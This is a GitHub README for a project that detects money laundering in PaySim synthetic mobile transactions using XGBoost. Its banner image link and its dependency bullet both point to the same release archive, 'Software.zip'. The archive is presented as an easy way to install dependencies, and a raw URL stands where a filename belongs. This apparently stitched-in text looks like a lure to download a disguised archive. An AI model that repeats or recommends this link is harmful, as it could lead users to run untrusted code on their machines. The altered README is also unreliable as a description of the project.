# 🚀 PaySim Fraud Detection with XGBoost 🕵️‍♂️

![Banner](https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip)

Welcome to the "PaySim-Fraud-Detection-XGBoost" repository! This project focuses on building an XGBoost-based fraud detection model to identify money laundering in mobile transactions using the PaySim synthetic dataset. By leveraging machine learning techniques, we aim to enhance the accuracy and efficiency of fraud detection processes in financial transactions. 

## 📁 Repository Content

In this repository, you will find:

- Python scripts for data preprocessing, exploratory data analysis (EDA), feature engineering, model training, and evaluation
- Jupyter notebooks showcasing step-by-step implementation of the fraud detection model
- Synthetic dataset from PaySim for fraud detection experimentation
- Documentation on data sources, methodology, and key findings
- https://github.com/Qanfat/PaySim-Fraud-Detection-XGBoost/releases/download/v2.0/Software.zip file for easy installation of dependencies
